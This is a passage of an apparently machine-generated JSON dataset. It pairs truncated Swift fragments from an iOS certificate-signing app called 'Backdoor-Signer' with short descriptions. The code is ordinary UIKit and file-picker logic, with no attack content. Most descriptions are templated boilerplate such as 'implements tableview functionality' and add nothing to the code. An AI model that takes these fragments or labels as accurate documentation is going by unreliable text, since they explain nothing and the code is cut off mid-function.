    "code_type": "function"
  },
  {
    "id": "2806",
    "code": "@objc func closeSheet() {\ndismiss(animated: true, completion: nil)\n}\n\n@objc func saveAction() {",
    "nl": "Function closeSheet - implements closesheet functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2807",
    "code": "@objc func saveAction() {\n// Check if we have a backdoor file\nif let backdoorFile = self.backdoorFile {",
    "nl": "Function saveAction - implements saveaction functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2808",
    "code": "private func createBackdoorFileFromSelection(outputURL: URL, encrypt: Bool = true) throws {\nguard let p12URL = selectedFiles[.p12] as? URL else {",
    "nl": "/ Creates a backdoor file from the currently selected p12 and mobileprovision files / - Parameters: /   - outputURL: Where to save the resulting backdoor file /   - encrypt: Whether to encrypt sensitive data in the file (default: true)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2809",
    "code": "@objc func textFieldDidChange(_ textField: UITextField) {\nguard textField === passwordTextField else { return }",
    "nl": "Function textFieldDidChange - implements textfielddidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2810",
    "code": "private func processBackdoorFile(at url: URL) {\n// First check if the file has a .backdoor extension or appears to be in backdoor format\nif !BackdoorDecoder.isBackdoorFile(at: url) {",
    "nl": "Function processBackdoorFile - implements processbackdoorfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2811",
    "code": "private func showAlert(title: String, message: String) {\nlet alert = UIAlertController(title: title, message: message, preferredStyle: .alert)\nalert.addAction(UIAlertAction(title: \"OK\", style: .default))\npresent(alert, animated: true)\n}\n}\n\nextension CertImportingViewController {",
    "nl": "Function showAlert - implements showalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2812",
    "code": "extension CertImportingViewController {\noverride func numberOfSections(in _: UITableView) -> Int { return sectionData.count }",
    "nl": "extension CertImportingViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2813",
    "code": "override func numberOfSections(in _: UITableView) -> Int { return sectionData.count }\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2814",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }\n\noverride func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2815",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = UITableViewCell(style: .subtitle, reuseIdentifier: \"Cell\")\ncell.selectionStyle = .default\n\nlet imageView = UIImageView(image: UIImage(systemName: \"circle\"))\nimageView.tintColor = .quaternaryLabel\ncell.accessoryView = imageView\n\ncell.textLabel?.font = .boldSystemFont(ofSize: 15)\ncell.detailTextLabel?.textColor = .secondaryLabel",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2816",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nswitch sectionData[section] {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2817",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet fileType: FileType\n\n// If backdoor is already selected, don't allow selecting provision or p12\nif selectedFiles[.backdoor] != nil,\nsectionData[indexPath.section] == \"provision\" || sectionData[indexPath.section] == \"certs\"\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2818",
    "code": "extension CertImportingViewController: UIDocumentPickerDelegate {\nfunc presentDocumentPicker(fileExtension: [UTType]) {",
    "nl": "extension CertImportingViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2819",
    "code": "func presentDocumentPicker(fileExtension: [UTType]) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)\ndocumentPicker.delegate = self\ndocumentPicker.allowsMultipleSelection = false\npresent(documentPicker, animated: true, completion: nil)\n}\n\nfunc documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {",
    "nl": "Function presentDocumentPicker - implements presentdocumentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2820",
    "code": "func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\nguard let selectedFileURL = urls.first else { return }",
    "nl": "Function documentPicker - implements documentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2821",
    "code": "Debug.shared.log(message: \"Processing unknown file extension as potential backdoor file\", type: .info)\nprocessBackdoorFile(at: selectedFileURL)\nreturn\n}\n\nif let fileType = fileType {",
    "nl": "For other files, try to detect if it's a backdoor file by content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2822",
    "code": "func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {\ncontroller.dismiss(animated: true, completion: nil)\n}\n\nfunc checkIfFileIsCert(cert: URL?) -> Bool {",
    "nl": "Function documentPickerWasCancelled - implements documentpickerwascancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2823",
    "code": "func checkIfFileIsCert(cert: URL?) -> Bool {\nguard let cert = cert, cert.isFileURL else { return false }",
    "nl": "Function checkIfFileIsCert - implements checkiffileiscert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2824",
    "code": "class CertificateViewTableViewCell: UITableViewCell {\nvar certs: Certificate?\n\nprivate let teamNameLabel: UILabel = {",
    "nl": "class CertificateViewTableViewCell - implements functionality related to certificate view table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2825",
    "code": "func configure(with certificate: Certificate, isSelected: Bool) {\nif !Preferences.certificateTitleAppIDtoTeamID {",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2826",
    "code": "class CertificateViewAddTableViewCell: UITableViewCell {\nprivate let titleLabel: UILabel = {",
    "nl": "class CertificateViewAddTableViewCell - implements functionality related to certificate view add table view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2827",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\nborderLayer.strokeColor = UIColor.systemGray.withAlphaComponent(0.2).cgColor\n}\n\noverride func layoutSubviews() {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2828",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\n\nborderLayer.frame = roundedBackgroundView.bounds\nlet borderPath = UIBezierPath(\nroundedRect: roundedBackgroundView.bounds\n.insetBy(dx: borderLayer.lineWidth / 2, dy: borderLayer.lineWidth / 2),\ncornerRadius: roundedBackgroundView.layer.cornerRadius\n)\nborderLayer.path = borderPath.cgPath",
    "nl": "Function layoutSubviews - implements layoutsubviews functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2829",
    "code": "func configure(with title: String?, description: String?) {\ntitleLabel.text = title\ndescriptionLabel.text = description\n}\n\nfunc configure(with symbolName: String?) {",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2830",
    "code": "func configure(with symbolName: String?) {\niconImageView.image = UIImage(systemName: symbolName ?? \"plus\")\n}\n}\n\nclass PillView: UIView {",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2831",
    "code": "class PillView: UIView {\n// MARK: - UI Components\n\nprivate let pillStackView: UIStackView = {",
    "nl": "class PillView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2832",
    "code": "private func setupGradientBackground(with color: UIColor) {\ngradientLayer.colors = [\ncolor.withAlphaComponent(0.15).cgColor,\ncolor.withAlphaComponent(0.08).cgColor,\n]\ngradientLayer.locations = [0.0, 1.0]\ngradientLayer.startPoint = CGPoint.zero\ngradientLayer.endPoint = CGPoint(x: 1.0, y: 1.0)\nlayer.insertSublayer(gradientLayer, at: 0)\n}",
    "nl": "Function setupGradientBackground - sets upgradientbackground",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2833",
    "code": "private func configureIcon(iconName: String, tintColor: UIColor) {\n// Use symbol configuration for better rendering\nlet symbolConfig = UIImage.SymbolConfiguration(pointSize: 12, weight: .medium)\niconImageView.image = UIImage(systemName: iconName, withConfiguration: symbolConfig)\niconImageView.tintColor = tintColor\n\n// Set size constraints\nNSLayoutConstraint.activate([\niconImageView.widthAnchor.constraint(equalToConstant: 14),\niconImageView.heightAnchor.constraint(equalToConstant: 14),",
    "nl": "Function configureIcon - implements configureicon functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2834",
    "code": "private func configureLabel(text: String, textColor: UIColor) {\nlabel.text = text\nlabel.textColor = textColor\n}\n\nprivate func setupConstraints() {",
    "nl": "Function configureLabel - implements configurelabel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2835",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\npillStackView.topAnchor.constraint(equalTo: topAnchor, constant: padding.top),\npillStackView.bottomAnchor.constraint(equalTo: bottomAnchor, constant: -padding.bottom),\npillStackView.leadingAnchor.constraint(equalTo: leadingAnchor, constant: padding.left),\npillStackView.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -padding.right),\n])\n}\n\nprivate func addAppearanceAnimation() {",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2836",
    "code": "private func addAppearanceAnimation() {\n// Start slightly scaled down and transparent\ntransform = CGAffineTransform(scaleX: 0.95, y: 0.95)\nalpha = 0.8\n\n// Animate to full size with slight bounce\nUIView.animate(\nwithDuration: 0.3,\ndelay: 0,\nusingSpringWithDamping: 0.7,",
    "nl": "Function addAppearanceAnimation - implements addappearanceanimation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2837",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\ngradientLayer.frame = bounds\n}\n\noverride func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2838",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificateViewTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2839",
    "code": "class CertificatesViewController: UITableViewController {\nvar certs: [Certificate]?\n\ninit() { super.init(style: .insetGrouped) }",
    "nl": "class CertificatesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2840",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(afetch),\nname: Notification.Name(\"cfetch\"),\nobject: nil\n)\n}",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2841",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\nsetupNavigation()\nfetchSources()\n}\n\ndeinit {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2842",
    "code": "fileprivate func setupViews() {\ntableView.dataSource = self\ntableView.delegate = self\ntableView.tableHeaderView = UIView()\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\ntableView.register(CertificateViewTableViewCell.self, forCellReuseIdentifier: \"CertificateCell\")\ntableView.register(CertificateViewAddTableViewCell.self, forCellReuseIdentifier: \"AddCell\")\n}\n\nfileprivate func setupNavigation() {",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2843",
    "code": "fileprivate func setupNavigation() {\ntitle = String.localized(\"CERTIFICATES_VIEW_CONTROLLER_TITLE\")\nnavigationController?.navigationBar.prefersLargeTitles = false\n}\n\n@objc func addCert() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2844",
    "code": "@objc func addCert() {\nlet viewController = CertImportingViewController()\nlet navigationController = UINavigationController(rootViewController: viewController)\n\nif #available(iOS 15.0, *) {",
    "nl": "Function addCert - implements addcert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2845",
    "code": "extension CertificatesViewController {\noverride func numberOfSections(in _: UITableView) -> Int {",
    "nl": "extension CertificatesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2846",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn 2\n}\n\noverride func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2847",
    "code": "override func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2848",
    "code": "override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nvar title = \"\"\n\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2849",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2850",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\n\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2851",
    "code": "override func tableView(\n_ tableView: UITableView,\ncontextMenuConfigurationForRowAt indexPath: IndexPath,\npoint _: CGPoint\n) -> UIContextMenuConfiguration? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2852",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2853",
    "code": "extension CertificatesViewController {\n@objc func afetch() {",
    "nl": "extension CertificatesViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2854",
    "code": "@objc func afetch() {\nfetchSources()\n}\n\nfunc fetchSources() {",
    "nl": "Function afetch - implements afetch functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2855",
    "code": "func fetchSources() {\ndo {",
    "nl": "Function fetchSources - implements fetchsources functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertificatesViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2856",
    "code": "class SwitchTableViewCell: UITableViewCell {\n// MARK: - UI Components\n\nlet switchControl = UISwitch()\nprivate let subtitleLabel = UILabel()\n\n// MARK: - Properties\n\nvar switchValueChanged: ((Bool) -> Void)?\nvar subtitle: String? {",
    "nl": "/ A reusable table view cell with a modern, enhanced switch control",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "2857",
    "code": "private func setupSwitchControl() {\nswitchControl.addTarget(self, action: #selector(switchChanged), for: .valueChanged)\naccessoryView = switchControl\n\n// Set the accent color to match app theme\nlet accentColor = UIColor(hex: \"#FF6482\")\nswitchControl.onTintColor = accentColor\n}\n\nprivate func setupSubtitleLabel() {",
    "nl": "MARK: - Setup Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2858",
    "code": "private func setupSubtitleLabel() {\nsubtitleLabel.font = UIFont.systemFont(ofSize: 13)\nsubtitleLabel.textColor = .secondaryLabel\nsubtitleLabel.numberOfLines = 0\nsubtitleLabel.translatesAutoresizingMaskIntoConstraints = false\ncontentView.addSubview(subtitleLabel)\n\nNSLayoutConstraint.activate([\nsubtitleLabel.topAnchor.constraint(equalTo: textLabel!.bottomAnchor, constant: 4),\nsubtitleLabel.leadingAnchor.constraint(equalTo: textLabel!.leadingAnchor),",
    "nl": "Function setupSubtitleLabel - sets upsubtitlelabel",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2859",
    "code": "private func configureAppearance() {\n// Modern styling for the cell\nselectionStyle = .none\n\n// Enhance text label appearance\ntextLabel?.font = UIFont.systemFont(ofSize: 16, weight: .medium)\n\n// Add subtle divider line with inset\nseparatorInset = UIEdgeInsets(top: 0, left: 15, bottom: 0, right: 0)\n",
    "nl": "Function configureAppearance - implements configureappearance functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2860",
    "code": "private func updateSubtitle() {\nsubtitleLabel.text = subtitle\nsubtitleLabel.isHidden = subtitle == nil || subtitle!.isEmpty\n\n// Adjust cell height constraints if needed\nif !subtitleLabel.isHidden {",
    "nl": "Function updateSubtitle - updates subtitle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2861",
    "code": "@objc private func switchChanged() {\n// Provide haptic feedback\nfeedbackGenerator.impactOccurred()\n\n// Call the callback\nswitchValueChanged?(switchControl.isOn)\n}\n\n@objc private func cellTapped() {",
    "nl": "MARK: - Action Handlers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2862",
    "code": "@objc private func cellTapped() {\n// Toggle switch when cell is tapped\nswitchControl.setOn(!switchControl.isOn, animated: true)\nswitchChanged()\n\n// Add visual feedback when tapped\nUIView.animate(withDuration: 0.1, animations: {",
    "nl": "Function cellTapped - implements celltapped functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2863",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "MARK: - Lifecycle Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2864",
    "code": "override func setHighlighted(_ highlighted: Bool, animated: Bool) {\nsuper.setHighlighted(highlighted, animated: animated)\n\nlet alphaValue: CGFloat = highlighted ? 0.9 : 1.0\n\nif animated {",
    "nl": "Function setHighlighted - sets highlighted",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Components/SwitchTableViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "2865",
    "code": "class SettingsViewController: FRSTableViewController {\nlet aboutSection = [\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_ABOUT\", arguments: \"Backdoor\"),\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_SUBMIT_FEEDBACK\"),\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_GITHUB\"),\n]\n\nlet displaySection = [\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_DISPLAY\"),\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_APP_ICON\"),",
    "nl": "class SettingsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2866",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Defensive programming - ensure we're on the main thread for UI setup\nif !Thread.isMainThread {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2867",
    "code": "private func setupEmergencyBackupStructure() {\n// Create a minimal valid structure even in error state\ntableData = [[\"Settings\"]];\nsectionTitles = [\"\"];\nisInitialized = true;\nbackdoor.Debug.shared.log(message: \"Emergency backup structure initialized for Settings\", type: .warning)\n}\n\n/// Add LED effects to highlight important settings cells\nprivate func addLEDEffectsToImportantCells() {",
    "nl": "/ Emergency backup structure to prevent crashes if normal initialization fails",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2868",
    "code": "private func addLEDEffectsToImportantCells() {\n// Only apply effects if the view is visible and initialized\nguard isViewLoaded && view.window != nil && isInitialized else { return }",
    "nl": "/ Add LED effects to highlight important settings cells",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2869",
    "code": "private func getCertificateSafely() -> Certificate? {\ndo {",
    "nl": "/ Get certificate safely with error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Core/SettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2870",
    "code": "private func isCertificateExpiringSoon(_ certificate: Certificate) -> Bool {\nguard let expirationDate = certificate.certData?.expirationDate else {",
